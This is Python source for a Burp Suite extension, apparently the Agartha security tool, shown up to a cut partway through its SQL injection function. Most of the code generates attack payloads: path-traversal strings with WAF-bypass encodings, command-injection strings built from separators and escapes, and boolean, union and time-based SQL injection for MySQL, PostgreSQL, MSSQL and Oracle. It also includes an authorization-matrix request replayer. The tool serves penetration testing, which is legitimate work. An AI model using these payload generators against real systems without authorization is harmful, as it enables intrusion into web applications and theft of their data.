"""
Author: Volkan Dindar
        volkan.dindar@owasp.org
        https://github.com/volkandindar/agartha
"""
try:
    import sys, re, urlparse, random, os, urllib, posixpath
    from burp import (IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory, IBurpExtenderCallbacks, IExtensionHelpers)
    from java.awt import (BorderLayout, FlowLayout, Color, Font, Dimension, Toolkit)
    from javax.swing import (JCheckBox, JMenuItem, JTextPane, JTable, JScrollPane, JProgressBar, SwingConstants, JComboBox, JButton, JTextField, JSplitPane, JPanel, JLabel, JRadioButton, ButtonGroup, JTabbedPane, BoxLayout, JEditorPane, JList, DefaultListModel, DefaultListSelectionModel)
    from javax.swing.border import EmptyBorder
    from javax.swing.table import (DefaultTableModel, TableCellRenderer)
    from java.util import ArrayList
    from threading import Thread
    from java.awt.datatransfer import StringSelection
    from time import sleep
except:
    print "==== ERROR ====" + "\n\nFailed to load dependencies.\n" +str(sys.exc_info()[1]) +"\n\n==== ERROR ====\n\n"

VERSION = "2.001"
#url_regex = r'(log|sign)([-_+%0-9]{0,5})(off|out|in|on)|(expire|kill|terminat|delete|remove)'
url_regex = r'(log|sign|time)([-_+%0-9]{0,5})(off|out)|(expire|kill|terminat|delete|remove)'
ext_regex = r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff|woff2|ttf|otf)$'

class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory, IBurpExtenderCallbacks, IExtensionHelpers):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Agartha - LFI, RCE, SQLi, Auth, HTTP to JS")
        self._MainTabs = JTabbedPane()
        self._tabDictUI()
        self._tabAuthUI()
        self._tabAuthenticationUI()
        self._tabHelpUI()
        self._MainTabs.addTab("Payload Generator", None, self._tabDictPanel, None)
        self._MainTabs.addTab("Auth Matrix", None, self._tabAuthSplitpane, None)
        self._MainTabs.addTab("403 Bypass", None, self._tabAuthenticationSplitpane, None)
        self._MainTabs.addTab("Help", None, self._tabHelpJPanel, None)
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.issueAlert("The extension has been loaded.")
        print "Agartha(v" + VERSION + ") is a security tool for:\n\t\t* Local File Inclusion, Path Traversal\n\t\t* Command Injection, RCE\n\t\t* SQL Injection\n\t\t* Session based User Access Matrix\n\t\t* Authentication/Authorization Violations\n\t\t* HTTP 403 Bypass\n\t\t* Copy as Javascript\n\nFor more information and tutorial, please visit:\n\t\thttps://github.com/volkandindar/agartha\n\nAuthor:\n\t\tVolkan Dindar\n\t\tvolkan.dindar@owasp.org"
        self.reset(self)
        return

    def reset(self, ev):
        t = Thread(target=self.resetThread, args=[self])
        t.start()
        return

    def resetThread(self, ev):
        sleep(1)
        self.tableMatrixReset(self)
        self.resetAuthentication(self)
        return

    def authMatrixThread(self, ev):
        self._cbAuthColoringFunc(self)
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = " "
        self._tbAuthNewUser.setForeground (Color.black)
        self._btnAuthNewUserAdd.setEnabled(False)
        self._btnAuthRun.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self.progressBar.setValue(0)
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self.tableMatrix.clearSelection()
        for x in range(0, self.tableMatrix.getRowCount()):
            for y in range(1, self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt("", x, y)
        
        i = 1000000 / ( self.tableMatrix.getRowCount() * (self.tableMatrix.getColumnCount()-1) )

        for x in range(0, self.tableMatrix.getRowCount()):
            for y in range(1, self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt(self.makeHttpCall(self.tableMatrix.getValueAt(x, 0), self.tableMatrix.getColumnName(y)), x, y)
                self.progressBar.setValue(self.progressBar.getValue() + i)
                self._lblAuthNotification.text = "It is still in progress, '" + str(int(self.progressBar.getValue() / 10000))  + "%' has been completed so far."

        
        self._customRenderer = UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls, "")
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0, self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn(y).setCellRenderer(self._customRenderer)
        self.tableMatrix.repaint()
        self.tableMatrix.setSelectionForeground(Color.red)
        self._btnAuthNewUserAdd.setEnabled(True)
        self._btnAuthRun.setEnabled(True)
        self._cbAuthColoring.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.progressBar.setValue(1000000)
        self._lblAuthNotification.text = "Blue, Green, Purple and Beige colors are representation of users. Yellow, Orange and Red cell colors show warning levels."        
        return
    
    def headerAdjustment(self, _header, _url, userID):
        returnMethod = ''
        headerMethod = 'GET'
        header = ""

        if "GET" not in _header[:3]:
            _header = self._helpers.bytesToString(self._callbacks.getHelpers().toggleRequestMethod(_header))
            headerMethod = 'POST'

        histories = self._callbacks.getProxyHistory()[::-1]
        for history in histories:
            url = str(self._helpers.analyzeRequest(history).getUrl())
            if url.startswith("https"):
                url = url.replace(":443/", "/")
            elif url.startswith("http"):
                url = url.replace(":80/", "/")

            if  url == _url:
                if str(self._helpers.analyzeRequest(history.getRequest()).getMethod()) == 'GET':
                    header = str((self._helpers.bytesToString(history.getRequest())).split('\n', 1)[0]).split('\n', 1)[0]
                    returnMethod = 'GET'
                else:
                    header = (self._helpers.bytesToString(self._callbacks.getHelpers().toggleRequestMethod(history.getRequest()))).split('\n', 1)[0]
                    returnMethod = 'POST'
                break
        
        if not returnMethod:
            if headerMethod == 'GET':
                return _header
            else:
                return self._callbacks.getHelpers().toggleRequestMethod(_header)
        elif returnMethod == 'POST':
            _header = _header.replace(_header.split('\n', 1)[0], header)
            return self._callbacks.getHelpers().toggleRequestMethod(_header)
        elif returnMethod == 'GET':
            return _header.replace(_header.split('\n', 1)[0], header)

    def makeHttpCall(self, urlAdd, userID):
        try:
            userID = self.userNames.index(userID)
            header = self.userNamesHttpReq[userID]

            # changing new url path in the request header
            header =  header.replace(str(header.splitlines()[0]), header.splitlines()[0].split(" ", 2)[0] + " /" + urlAdd.split('/',3)[3] + " " + header.splitlines()[0].split(" ", 2)[2])

            # header methods
            if "GET" in header[:3] and self._cbAuthGETPOST.getSelectedIndex() == 1:
                # request was GET and will be in POST
                header = self._callbacks.getHelpers().toggleRequestMethod((header))
            elif "POST" in header[:4] and self._cbAuthGETPOST.getSelectedIndex() == 0:
                # request was POST alike and will be in GET
                header = self._callbacks.getHelpers().toggleRequestMethod((header))
            elif self._cbAuthGETPOST.getSelectedIndex() == 2:
                # request is dynamic, proxy history will be reference
                header = self.headerAdjustment(header, urlAdd, userID)

            portNum = 80
            if urlparse.urlparse(urlAdd).port:
                portNum = urlparse.urlparse(urlAdd).port
            else:
                if urlparse.urlparse(urlAdd).scheme == "https":
                    portNum = 443
    
            _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(urlAdd).hostname, portNum, urlparse.urlparse(urlAdd).scheme), header)
            self.httpReqRes[userID].append(_httpReqRes)
            
            return "HTTP " + str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode()) + " : " + format(len(self._helpers.bytesToString(_httpReqRes.getResponse())) - self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset(), ',d') + " bytes"
        except:
            return str(sys.exc_info()[1])

    def authAdduser(self, ev):
        if self.userCount == 4:
            self._lblAuthNotification.text = "You can add up to 4 users"
            self._lblAuthNotification.setForeground (Color.red)
            return
        
        if not self._tbAuthURL.getText().strip():
            self._lblAuthNotification.text = "Please provide minimum one URL!"
            self._lblAuthNotification.setForeground (Color.red)
            return

        for _url in self._tbAuthURL.getText().split('\n'):
            _url = _url.strip()
            if not self.isURLValid(str(_url)) or _url == self._txtURLDefault:
                self._tbAuthURL.setForeground (Color.red)
                self._lblAuthNotification.text = "URLs should start with 'http/s' and not have any spaces. Please check: '" + _url + "'"
                self._lblAuthNotification.setForeground (Color.red)
                return
        self._tbAuthURL.setForeground (Color.black)

        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthHeader.setForeground (Color.black)

        if self._tbAuthNewUser.text.strip() in self.userNames or not self._tbAuthNewUser.text.strip() or len(self._tbAuthNewUser.text.strip()) > 20:
            self._tbAuthNewUser.setForeground (Color.red)
            self._lblAuthNotification.text = "Please add another user name, that must be unique and less then 20 chars!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthNewUser.setForeground (Color.black)

        if self.userCount == 0:
            # header for unauth user
            unauthHeader = self._tbAuthHeader.getText().split('\n')[0] + "\n" + self._tbAuthHeader.getText().split('\n')[1]
            for line in self._tbAuthHeader.getText().split('\n')[2:]:
                if not any(re.findall(r'(cookie|token|auth)(.*:)', line, re.IGNORECASE)):
                    unauthHeader +=  "\n" + line
                if not line:
                    break
            self.userNamesHttpReq[0] = unauthHeader
        
        self.userCount = self.userCount + 1
        self.userNames.append(self._tbAuthNewUser.text.strip())
        self.userNamesHttpReq.append(self._tbAuthHeader.getText())
        self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text.strip())
        self.userNamesHttpUrls.append([])

        urlList = []
        _itemAdded = False
        for x in range(0, self.tableMatrix.getRowCount()):
            urlList.append(str(self.tableMatrix.getValueAt(x, 0)))
        for _url in set(self._tbAuthURL.getText().split('\n')):
            _url = _url.strip()
            if _url.count("/") == 2:
                _url += "/"
            _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
            if _url and not any(re.findall(url_regex, _url, re.IGNORECASE)) and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                # ignore logout, signoff, etc. paths
                if _url not in self.userNamesHttpUrls[self.userCount]:
                    # check first if the url exist in user's url list
                    self.userNamesHttpUrls[self.userCount].append(_url)
                    if _url not in urlList:
                        # check table if url exists
                        self.tableMatrix_DM.addRow([_url])
                        _itemAdded = True
        
        self._tbAuthURL.setText(self._tbAuthURL.getText().split('\n')[0]+"\n")
        self._btnAuthRun.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        if _itemAdded:
            self._lblAuthNotification.text = "'" + self._tbAuthNewUser.text.strip() + "' added successfully! Possible session terminators (signout, logoff, etc.), dangerous commands (kill, terminate, delete, etc.), and file types (gif, js, etc.) have been filtered out!"
            self._lblAuthNotification.setForeground (Color.black)
            self._cbAuthColoring.setEnabled(True)
            self._cbAuthGETPOST.setEnabled(True)
            self.tableMatrix.repaint()
            self.tableMatrix.setSelectionForeground(Color.red)
            self._customRenderer = UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls, "")
            self._customTableColumnModel = self.tableMatrix.getColumnModel()
            for y in range(0,self.tableMatrix.getColumnCount()):
                self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)
        else:
            self._lblAuthNotification.text = "No item has been added! User URLs may only have possible session terminators (signout, logoff, etc.), dangerous commands (kill, terminate, delete, etc.), or file types (gif, js, etc.). Please click 'Reset' button to refresh the screen."

        return

    def _cbAuthColoringFunc(self, ev):
        global _colorful
        if self._cbAuthColoring.isSelected():
            _colorful = True
        else:
            _colorful = False

        self.tableMatrix.repaint()
        return

    def _cbUnionBasedFunc(self, ev):
        if self._cbUnionBased.isSelected(): 
            self._cbUnionDepth.setEnabled(True)
        else:
            self._cbUnionDepth.setEnabled(False)
        return

    def funcGeneratePayload(self, ev):
        self._lblStatusLabel.setForeground (Color.red)
        self._tabDictResultDisplay.setText("")
        if self._rbDictSQLi.isSelected():            
            self._txtTargetPath.setText(self._txtDefaultSQLi)
        elif not self.isValid():
            if self._rbDictLFI.isSelected():
                self._lblStatusLabel.setText("File input is not valid. "+ self._txtDefaultLFI)
                self._txtTargetPath.setText(random.choice(["/etc/hosts", "C:\\windows\\system32\\drivers\\etc\\hosts"]))
            elif self._rbDictCommandInj.isSelected():
                self._lblStatusLabel.setText("Command input is not valid. " + self._txtDefaultCommandInj)
                self._txtTargetPath.setText(random.choice(["sleep 120", "timeout 120"]))
            return 

        self._lblStatusLabel.setForeground (Color.black)
        self._txtTargetPath.text = self._txtTargetPath.text.strip()
        self._lblStatusLabel.setText("")
        if self._rbDictCommandInj.isSelected():
            self.funcCommandInj(self)
        if self._rbDictLFI.isSelected():
            self.funcLFI(self)
        if self._rbDictSQLi.isSelected():
            self.funcSQLi(self)            
        return
       
    def isValid(self):
        # input should not be empty, should contain at least one alphanumeric char and less than 250 length
        if self._txtTargetPath.text.strip() and re.compile("[0-9a-zA-Z]").findall(self._txtTargetPath.text) and self._txtTargetPath.text.strip() !=self._txtDefaultLFI and self._txtTargetPath.text.strip() !=self._txtDefaultCommandInj and len(self._txtTargetPath.text.strip()) < 250:
            return True
        else:
            return False

    def funcRBSelection(self, ev):
        self._lblStatusLabel.setForeground (Color.black)
        self._lblStatusLabel.setText("")
        self._tabDictPanel_LFI.setVisible(False)
        self._cbDictCommandInjOpt.setVisible(False)
        self._tabDictPanel_SQLType.setVisible(False)
        self._tabDictPanel_SQLi.setVisible(False)
        self._tabDictPanel_SQLOptions.setVisible(False)
        self._tabDictResultDisplay.setText("")
        if self._rbDictLFI.isSelected():
            self._txtTargetPath.setText(self._txtDefaultLFI)
            self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
            self._tabDictPanel_LFI.setVisible(True)
            self._lblStatusLabel.setText("Please provide a path to generate payloads!")
        elif self._rbDictCommandInj.isSelected():
            self._txtTargetPath.setText(self._txtDefaultCommandInj)
            self._tabDictResultDisplay.setText(self._txtCheatSheetCommandInj)
            self._cbDictCommandInjOpt.setVisible(True)
            self._lblStatusLabel.setText("Please provide a command to generate payloads!")
        elif self._rbDictSQLi.isSelected():
            self._txtTargetPath.setText(self._txtDefaultSQLi)
            self._tabDictPanel_SQLType.setVisible(True)
            self._tabDictPanel_SQLi.setVisible(True)
            self._tabDictPanel_SQLOptions.setVisible(True)
            self.funcSQLi(self)
        return

    def funcCommandInj(self, ev):
        listCommandInj = []        
        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "%0d%0a"]
        escapeChars = ["",  "'", "\\'", "\\\\'", "\"", "\\\"", "\\\\\""]
        separators = ["&", "&&", "|", "||", ";"]
        
        for prefix in prefixes:
            for escapeChar in escapeChars:
                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                        continue
                for separator in separators:
                    listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + escapeChar + "\n")
                listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + separator + "\n")
                listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + "\n")
            listCommandInj.append(prefix + self._txtTargetPath.text + "\n")
            listCommandInj.append(prefix + "`" + self._txtTargetPath.text + "`" + "\n")

        listCommandInj = list(set(listCommandInj))
        listCommandInj.sort(reverse=True)
        
        if self._cbDictCommandInjEncoding.isSelected():
            listCommandInj = self.encodeURL(listCommandInj)
        
        self._tabDictResultDisplay.setText(''.join(map(str, listCommandInj)))
        self._lblStatusLabel.setText('Payload list for "' + self._txtTargetPath.text + '" command returns with '+ str(len(listCommandInj)) + ' result.')
        return

    def funcLFI(self, ev):
        listLFI = []
        dept = int(self._cbDictDepth.getSelectedItem())
        
        if self._txtTargetPath.text.startswith('/') or self._txtTargetPath.text.startswith('\\'):
            self._txtTargetPath.text = self._txtTargetPath.text[1:]
        
        filePath = self._txtTargetPath.text.replace("\\","/")
        
        counter = 0
        if self._cbDictEquality.isSelected():
            counter = dept

        while counter <= dept:
            _upperDirectory = ""
            i = 1
            while i <= counter:
                _upperDirectory += "../"
                i = i + 1
                listLFI.append(_upperDirectory + filePath + "\n")

            if self._cbDictWafBypass.isSelected():
                suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                for suffix in suffixes:
                    listLFI.append((_upperDirectory + filePath).replace("..", "...") + suffix + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("..", "....") + suffix + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("..", "..;") + suffix + "\n")
                    listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "...") + suffix + "\n")
                    listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "....") + suffix + "\n")
                    listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "..;") + suffix + "\n")

                prefixes = ["/", "\\", "/..;/", "..;/", ".//"]
                for prefix in prefixes:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(prefix + _upperDirectory + filePath + suffix + "\n")
                        if not "\\" in prefix and not "/..;/" in prefix :
                            listLFI.append(_upperDirectory + prefix + filePath + suffix + "\n")


                if "\\" in self._txtTargetPath.text:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(_upperDirectory.replace("/", "\\") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", "\\").replace("..", "...") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", "\\").replace("..", "....") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", "\\\\") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", "\\\\") + suffix + "\n")
                        listLFI.append(_upperDirectory + self._txtTargetPath.text.replace("/", "\\\\") + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", "\\") + suffix + "\n")

                _slashes = ["..././", "...\\.\\"]
                for _slash in _slashes:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(_upperDirectory.replace("../", _slash) + filePath + suffix + "\n")

                _slashes = ["\\", "\\\\", "\\\\\\", "//", "///", "\\/"]
                for _slash in _slashes:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(_upperDirectory.replace("/", _slash) + filePath + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", _slash) + self._txtTargetPath.text + suffix + "\n")                    
                        if "\\" in self._txtTargetPath.text:
                            listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "\\" + self._txtTargetPath.text + suffix + "\n")
                        else:
                            listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "/" + filePath + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", _slash) + suffix + "\n")


                _slashes = ["%2f", "%5c"   , "%252f"     , "%255c"     , "%c1%9c"      , "%c0%af"]
                _dots = ["%2e%2e", "%2e%2e", "%252e%252e", "%252e%252e", "%c0%2e%c0%2e", "%c0%2e%c0%2e"]
                suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]

                for i in range(len(_slashes)):
                    if _slashes[i].startswith("%c") or _slashes[i].startswith("%25"):
                        listLFI.append((_upperDirectory).replace("/", _slashes[i]) + filePath + "\n")
                        listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]) + "/" + filePath + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]) + "\n")
                        listLFI.append((_upperDirectory).replace("/", _slashes[i]).replace("..", _dots[i]) + filePath + "\n")
                        listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]).replace("..", _dots[i]) + "/" + filePath + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]).replace("..", _dots[i]) + "\n")                    
                        listLFI.append((_upperDirectory).replace("..", _dots[i]) + filePath + "\n")
                    else:
                        for suffix in suffixes:
                            listLFI.append((_upperDirectory).replace("/", _slashes[i]) + filePath + suffix + "\n")
                            listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]) + "/" + filePath + suffix + "\n")
                            listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]) + suffix + "\n")
                            listLFI.append((_upperDirectory).replace("/", _slashes[i]).replace("..", _dots[i]) + filePath + suffix + "\n")
                            listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]).replace("..", _dots[i]) + "/" + filePath + suffix + "\n")
                            listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]).replace("..", _dots[i]) + suffix + "\n")
                            listLFI.append((_upperDirectory).replace("..", _dots[i]) + filePath + suffix + "\n")

            counter = counter + 1

        listLFI = list(set(listLFI))
        listLFI.sort(reverse=True)
        self._tabDictResultDisplay.setText(''.join(map(str, listLFI)))
        self._lblStatusLabel.setText('Payload list for "' + self._txtTargetPath.text + '" path returns with '+ str(len(listLFI)) + ' result. Please make sure payload encoding is disabled, unless you are sure what you are doing.') 
        return

    def funcSQLi(self, ev):
        self._lblStatusLabel.setForeground (Color.black)
        if self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected():
            if not self._cbMysqlBased.isSelected() and not self._cbMssqlBased.isSelected() and not self._cbPostgreBased.isSelected() and not self._cbOracleBased.isSelected():
                self._lblStatusLabel.setForeground (Color.red)
                self._lblStatusLabel.setText('Please pick a database!')
                self._tabDictResultDisplay.setText('')
                return
        if not (self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected() or self._cbBooleanBased.isSelected()):
                self._lblStatusLabel.setForeground (Color.red)
                self._lblStatusLabel.setText('Please pick an attack type!')
                self._tabDictResultDisplay.setText('')
                return

        listSQLi = []
        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "%0d%0a"]
        escapeChars = ["", "'", "''", "\\'"]
        if not self._cbSqlWafBypass.isSelected():
            prefixes = [""]
            escapeChars = ["", "'"]
        n1 = str(random.randint(10, 70))
        n2 = str(random.randint(71, 99))
        boolExpressions = [n1 + "=" + n1, n1 + "<" + n2]
        suffixes = ["", " -- -", ") -- -", ")) -- -", "))) -- -"]

        if self._cbBooleanBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    for boolExpression in boolExpressions:
                        for suffix in suffixes[1:]:
                            listSQLi.append(prefix + escapeChar + " or " + boolExpression + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + " or " + boolExpression + "\n")
            for prefix in prefixes:
                for escapeChar in escapeChars[1:]:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    
                    listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + "\n")
                    listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + "\n")
                    for suffix in suffixes[1:]:
                        listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                        listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                if self._cbPostgreBased.isSelected():
                    listSQLi.append(prefix + "$$ or $$xyz$$=$$xyz\n")
                    for suffix in suffixes[1:]:
                        listSQLi.append(prefix + "$$ or $$xyz$$=$$xyz$$" + suffix + "\n")
                        listSQLi.append(prefix + " or $$xyz$$=$$xyz$$" + suffix + "\n")

        unions = ["null", "1337", "'1337'"]
        if self._cbSqlWafBypass.isSelected():
            unions = ["null", "1337", "'1337'", "''1337''"]

        if self._cbUnionBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    for suffix in suffixes[1:]:
                        for union in unions:
                            unionPhrase = " union all select "
                            for i in range(int(self._cbUnionDepth.getSelectedItem())):
                                unionPhrase += union
                                if self._cbMysqlBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select sleep(60)") + suffix + "\n")
                                        if not escapeChar:
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select sleep(60)") + "\n")
                                if self._cbPostgreBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(60))") + suffix + "\n")
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as text)") + suffix + "\n")
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as integer)") + suffix + "\n")
                                        if not escapeChar:
                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(60))") + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as text)") + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as integer)") + "\n")
                                if self._cbMssqlBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        if escapeChar:
                                            listSQLi.append(prefix + escapeChar + unionPhrase + " waitfor delay " + escapeChar + "00:01" + escapeChar + suffix + "\n")
                                        else:
                                            listSQLi.append(prefix + unionPhrase + " waitfor delay '00:01'" + "\n")
                                            if self._cbSqlWafBypass.isSelected():
                                                listSQLi.append(prefix + unionPhrase + " waitfor delay \\'00:01\\'" + "\n")
                                                listSQLi.append(prefix + unionPhrase + " waitfor delay ''00:01''" + "\n")
                                if self._cbOracleBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + " from dual" + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + " from dual" + "\n")
                                    if self._cbTimeBased.isSelected():
                                        if escapeChar:
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)") + " from dual" + suffix + "\n")                                            
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,60)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as integer)") + " from dual" + suffix + "\n")
                                        else:
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(('a'),60)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(('a'),60)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,60)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,60)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as varchar2(10))") + " from dual" + "\n")
